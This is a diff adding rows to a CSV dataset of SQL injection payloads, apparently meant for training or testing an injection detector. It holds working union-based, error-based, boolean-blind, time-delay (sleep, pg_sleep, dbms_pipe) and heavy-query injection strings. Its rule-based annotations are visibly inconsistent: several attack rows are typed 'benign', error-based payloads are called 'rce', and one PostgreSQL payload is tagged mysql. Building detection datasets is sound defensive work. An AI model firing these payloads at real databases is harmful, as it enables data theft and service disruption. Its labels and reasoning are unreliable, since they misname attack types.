@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+9660,-7273%' ) ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9661,"-8005"" ) union all select 5213,5213,5213,5213,5213--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9662,"1' in boolean mode ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
+9663,"-2168"" ) ) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9664,"1"" ) where 6903 = 6903",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9665,"1'|| ( select 'asfl' from dual where 5846 = 5846 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,boolean_blind,oracle,0.95,5846 = 5846 or detected — boolean_blind injection (priority 8) on oracle,rule-based
+9666,"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9667,"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+9668,"1"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
+9669,"1"" ) as ucex where 5148 = 5148 order by 1#",1,,boolean_blind,generic,0.95,5148 = 5148 or detected — boolean_blind injection (priority 8) on generic,rule-based
+9670,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'qrtf' = 'qrtf,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+9671,"-8178 ) union all select 4163,4163,4163,4163,4163,4163,4163--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9672,"-5832"" ) or 1650 = 9011--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9673,"-3282' ) union all select 9002,9002,9002,9002,9002#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9674,"1 ) where 5615 = 5615 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+9675,"-1134"" union all select 4865,4865,4865,4865,4865#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9676,"-1908"" ) ) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9677,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9678,"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
+9679,"-9737"" ) ) ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9680,1' ) as wvvo where 4288 = 4288,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9681,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9682,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+9683,"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9684,1'|| ( select 'ubza' where 2576 = 2576,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9685,-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9686,1 ) ) as vmwj where 5597 = 5597,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9687,"-8301' ) union all select 1806,1806--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9688,1' ) as sruz where 6318 = 6318,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9689,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
